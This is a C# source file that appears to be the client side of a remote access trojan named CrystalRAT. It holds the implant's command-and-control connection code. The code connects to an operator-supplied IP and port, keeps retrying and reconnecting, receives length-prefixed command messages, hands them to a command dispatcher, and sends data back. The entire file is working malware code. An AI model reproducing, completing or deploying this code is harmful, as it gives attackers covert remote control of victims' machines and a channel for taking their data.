using CrystalRATShared.Serialization;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Zombie.Functions;

namespace Zombie.Web
{
    public static class Client
    {

        private static readonly Queue<Action> sendRequest = new Queue<Action>();
        private static readonly ManualResetEvent sendingDone = new ManualResetEvent(false);

        private static string _ip;
        private static int _port;
        private static bool _inited = false;
        private static bool sendMonitorRunning = false;

        public static Socket Socket { get; private set; }



        public static void RestartSocket()
        {
            _inited = false;
            Socket.Shutdown(SocketShutdown.Both);
            Socket.Close();
            sendRequest.Clear();
            sendingDone.Set();
            Thread.Sleep(500);
            sendingDone.Reset();
            SocketInit();
        }
        private static void SocketInit()
        {
            if (_inited)
            {
                throw new InvalidOperationException("Client is already initialized.");
            }


            Socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            _inited = true;

            while (true)
            {
                try
                {
                    Socket.Connect(_ip, _port);
                    Receive();
                    break;
                }

                catch (SocketException)
                {
                    Console.WriteLine("Connection failed. Retrying in 10 seconds.");
                    Thread.Sleep(10000);
                }



            }
        }

        private static void Receive()
        {
            byte bufLength = 4;
            byte[] buffer = new byte[bufLength];

            try
            {
                Socket.BeginReceive(buffer, 0, bufLength, 0, new AsyncCallback(ReceiveCallback), buffer);
            }
            catch (SocketException)
            {
                Console.WriteLine("Disconnected. Restarting client.");
                RestartSocket();

            }


        }



        private static void ReceiveCallback(IAsyncResult ar)
        {
            // TODO: ERROR CONTROL AND OPERATION TIMEOUT.

            byte[] sizeBuf = (byte[])ar.AsyncState;

            try
            {
                Socket.EndReceive(ar);
            }

            catch (SocketException)
            {
                Console.WriteLine("Disconnected. Restarting client.");
                RestartSocket();
                return;

            }

            int bufSize = BitConverter.ToInt32(sizeBuf, 0);
            byte[] buffer;

            MemoryStream ms = new MemoryStream();

            while (bufSize > 0)
            {
                if (bufSize < Socket.ReceiveBufferSize)
                {
                    buffer = new byte[bufSize];
                }

                else
                {
                    buffer = new byte[Socket.ReceiveBufferSize];
                }

                int rec = Socket.Receive(buffer, 0, buffer.Length, 0);
                bufSize -= rec;

                ms.Write(buffer, 0, rec);
            }

            ms.Close();

            byte[] data = ms.ToArray();

            ms.Dispose();

            CommandDataSerializer.Deserialize(data, FunctionManager.Process);

            Receive();



        }

        public static void Start(string ip, int port)
        {
            _ip = ip;
            _port = port;

            SocketInit();
            SendMonitor();

        }

        private static void SendMonitor()
        {
            if (!sendMonitorRunning)
                Task.Run(async () =>
                {
                    sendMonitorRunning = true;
                    while (true)
                    {
                        await Task.Delay(10);
                        if (sendRequest.Count > 0)
                        {
                            sendRequest.Dequeue()();
                            sendingDone.WaitOne();
                        }
                        else break;
                    }
                    sendMonitorRunning = false;
                });

        }




        public static void Send(byte[] data)
        {

            sendRequest.Enqueue(() =>
            {
                sendingDone.Reset();
                byte[] dataLength = BitConverter.GetBytes(data.Length);
                try
                {
                    Socket.BeginSend(dataLength, 0, dataLength.Length, 0, new AsyncCallback(SendCallback), data);
                }

                catch (SocketException)
                {
                    RestartSocket();
                }
            });

            SendMonitor();


        }

        private static void SendCallback(IAsyncResult ar)
        {
            try
            {
                Socket.EndSend(ar);
                Socket.Send((byte[])ar.AsyncState);
            }
            catch (SocketException)
            {
                RestartSocket();
            }
            sendingDone.Set();
        }
    }
}
